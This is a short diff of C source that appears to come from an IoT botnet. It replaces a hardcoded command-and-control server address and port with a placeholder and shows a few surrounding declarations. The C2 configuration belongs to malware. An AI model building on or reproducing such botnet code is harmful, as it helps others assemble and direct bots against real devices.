@@ -37,7 +37,7 @@
 #define STD_PIGZ 50
 #define std_packet 1460
 
-unsigned char *OreoServer[] = { "165.22.68.9:666" };
+unsigned char *OreoServer[] = { "IPHERE:89" };
 
 unsigned char *fdgets(unsigned char *, int, int);
 int ioctl_pid = 0;
